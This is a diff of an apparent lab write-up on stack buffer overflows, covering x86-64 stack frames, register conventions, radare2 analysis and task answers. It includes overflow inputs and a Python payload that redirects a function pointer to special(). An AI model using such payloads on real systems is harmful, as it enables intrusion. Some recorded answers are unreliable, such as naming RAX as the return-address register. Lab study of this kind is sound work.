@@ -40,8 +40,8 @@ Used for dynamic memory allocation (e.g., malloc). It grows upwards as needed, a
 - Program Code and Data  
 Contains the program’s executable instructions and its initialised global variables.
 
-## Q1 Where is dynamically allocated memory stored? heap
-## Q2 Where is information about functions(e.g. local arguments) stored? stack
+## Q1 Task 2: Where is dynamically allocated memory stored? Answer: heap
+## Q2 Task 2: Where is information about functions(e.g. local arguments) stored? Answer: stack
 
 # Task 3 x86-64 Procedures
 
@@ -106,10 +106,8 @@ calc(4, 5);
 ```
 Calling calc(4, 5) creates a stack frame for calc, which then calls add, creating another stack frame above it.
 
-## Q1: What direction does the stack grow? (lower/higher), use the symbol "|" to represent lower and the symbol "/" to represent higher.
-A: questions wrong answer is l.
-## Q2: What instruction is used to add data onto the stack?
-Answer: push
+## Q1 Task 3: What direction does the stack grow? (lower/higher), use the symbol "|" to represent lower and the symbol "/" to represent higher: A: questions wrong answer is l.
+## Q2 Task 3: What instruction is used to add data onto the stack? Answer: push
 
 # Task 4 Procedures from task 3 continued 
 
@@ -133,7 +131,7 @@ When this happens:
 <img width="644" height="328" alt="image" src="https://github.com/user-attachments/assets/caa80e6e-683a-42f5-918b-418899329cb5" />
 
 
-Stack Layout During the Call
+## Stack Layout During the Call
 ```
 Stack Bottom
 ┌───────────────────────────────┐
@@ -145,18 +143,18 @@ Stack Bottom
 ├───────────────────────────────┤
 │ Stack frame for add           │
 └───────────────────────────────┘
-```
 
 Stack Top
 When add finishes, it executes retq:
 - Pops the return address off the stack
 - Removes its stack frame
 - Restores rsp, rbp, and rip to return to calc
+```
 
 <img width="650" height="358" alt="image" src="https://github.com/user-attachments/assets/f391035a-ad8c-45f7-a877-ac0916ce9dc3" />
 
 
-Passing Data Between Functions
+## Passing Data Between Functions
 Arguments are passed using registers.
 Up to 6 arguments can be stored in:
 
@@ -172,7 +170,7 @@ r9	      6th argument
 The return value is stored in rax.
 If there are more than 6 arguments, the extras go on the stack.
 
-Register Saving Rules
+## Register Saving Rules
 To prevent overwriting values:
 
 Type	              Registers	                      Saved By
@@ -181,7 +179,7 @@ Callee-saved	      rbx, r12, r13, r14, rbp, rsp	  Callee
 Argument registers	rdi, rsi, rdx, rcx, r8, r9	    Caller
 
 
-Runtime Stack Overview
+## Runtime Stack Overview
 ```
 ┌───────────────────────────────┐
 │ Argument n                    │
@@ -194,7 +192,8 @@ Runtime Stack Overview
 └───────────────────────────────┘
 ```
 
-## Q1 What register stores the return address? Answer: RAX
+## Q1 Task 4: What register stores the return address? Answer: RAX
+
 
 # Task 5: Endianess
 
@@ -205,6 +204,8 @@ Let’s take the hexadecimal number 0x12345678 as an example:
 Most Significant Byte (MSB) → 12
 
 Least Significant Byte (LSB) → 78
+
+## Q1 Task 5: No answers required.
 
 # Task 6 Overwriting Variables
 
@@ -256,8 +257,9 @@ You’ll see that the integer variable’s value changes, demonstrating a buffer
 - Ssh log in first
 - Compile c code first
 - Ends with normal warnings nothing of concern.
+
+Using contents first of overflow-1 folder
 ```
- ~]$ cd overflow-1
 overflow-1]$ ls -la
 total 16
 drwxrwxr-x 2 user1 user1   48 Sep  2  2019 .
@@ -278,9 +280,11 @@ If not compiled just run with gcc to compile for c code:
 ... Warnings listed but compiles fine.
 ```
 
-## A closer look at RADARE2, then run analysis 'aaa'
+## A closer look at RADARE2, then run analysis 'aaa', 'afl'
 
-radare2 is mentioned in the first section but up to this point is not even mentioned in use with the problems at hand
+Radare2 is mentioned in the first section but up to this point is not even mentioned in any task, but example output is shown in task 4 but not identified that it was from radare2. So thought I would start with some basic commands to demonstrate some of its use. 
+
+Note radare2 and gbd are installed on the attack box for use.
 
 ```
 [user1@ip-10-49-147-85 overflow-1]$ radare2 int-overflow
@@ -348,19 +352,22 @@ Example of 14 A's
 [user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
 AAAAAAAAAAAAAA
 Try again?
-...
 ```
-What 32 or 15 show
+What 32
 ```
 [user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 You have changed the value of the variable
 Segmentation fault
+```
+Success with 15 A's
+```
 [user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
 AAAAAAAAAAAAAAA
 You have changed the value of the variable
-[user1@ip-10-49-129-36 overflow-1]$ 
 ```
+
+## Q1 Task 6: What is the minimum number of characters needed to overwrite the variable? Answer: 15
 
 
 # Task 7 Overwriting Function Pointers
@@ -397,7 +404,7 @@ int main(int argc, char **argv)
 }
 ```
 
-Similar to the example above, data is read into a buffer using the gets function, but the variable above the buffer is not a pointer to a function. A pointer, like its name implies, is used to point to a memory location, and in this case the memory location is that of the normal function. The stack is laid out similar to the example above, but this time you have to find a way of invoking the special function(maybe using the memory address of the function). Try invoke the special function in the program. 
+Similar to the example in task 6, data is read into a buffer using the gets function, but the variable above the buffer is not a pointer to a function. A pointer, like its name implies, is used to point to a memory location, and in this case the memory location is that of the normal function. The stack is laid out similar to the example above, but this time you have to find a way of invoking the special function(maybe using the memory address of the function). Try invoke the special function in the program. 
 
 Keep in mind that the architecture of this machine is little endian!
 
@@ -414,7 +421,7 @@ When you overflow the buffer, you replace the bytes of new_ptr with the bytes of
 
 The CPU expects that address in little‑endian byte order.
 
-A closer look at the functions using radare2 in AFL the address of special() is 0x00400567
+## A closer look at the functions using radare2 in AFL the address of special() is 0x00400567
 ```
 overflow-2]$ radare2 func-pointer
  -- I love gradients.
@@ -484,11 +491,12 @@ From above the line in overflow-2/func-pointer.c code 'volatile int (*new_ptr) (
 0x004005b8      48c745f88205...   mov qword [var_8h], sym.normal
 ```
 From the above pdf @ main we get 
+```
 \u2502           ; var char **var_30h @ rbp-0x30     -> argv
 \u2502           ; var int64_t var_24h @ rbp-0x24    -> argc
 \u2502           ; var char *s @ rbp-0x16            -> buffer
 \u2502           ; var int64_t var_8h @ rbp-0x8      -> new_ptr
-
+```
 
 From pdf @ main:
 - s (your buffer[14]) is at: rbp - 0x16
@@ -509,7 +517,7 @@ So your final payload is:
 python -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
 ```
 
-You should see: 
+## Q1 Task 7: Invoke the special function: Answer: You should see: 
 ```
 [... overflow-2]$ python --version
 Python 2.7.18
